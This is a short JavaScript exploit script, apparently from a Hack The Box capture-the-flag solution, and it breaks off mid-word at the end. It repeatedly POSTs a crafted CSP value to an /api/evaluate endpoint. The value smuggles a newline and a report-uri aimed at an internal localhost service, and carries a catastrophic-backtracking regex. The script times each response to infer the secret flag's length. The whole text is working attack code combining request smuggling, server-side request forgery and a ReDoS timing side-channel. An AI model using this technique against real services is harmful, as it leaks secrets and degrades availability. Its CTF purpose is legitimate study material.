var length_of_flag = 0;
for(var i=0; i<100; i++){
    var secretCode = encodeURIComponent("^(?=HTB{.{"+i+"}})((.*)*)*salt$");
    var sendDate = (new Date()).getTime();
    var timelapsed = await fetch("/api/evaluate", {
      "headers": {
        "content-type": "application/json"
      },
      "body": "{\"csp\":\"report-uri http://127.1:1337/deactivate?secretCode="+secretCode+"\\n\"}",
      "method": "POST",
      "mode": "cors",
      "credentials": "include"
    }).then(function(res){var receiveDate = (new Date()).getTime();var responseTimeMs = receiveDate-sendDate;return responseTimeMs/1000;});;
    if(timelapsed > 2) {
        length_of_flag = i;
        break;
    }
}
Obta
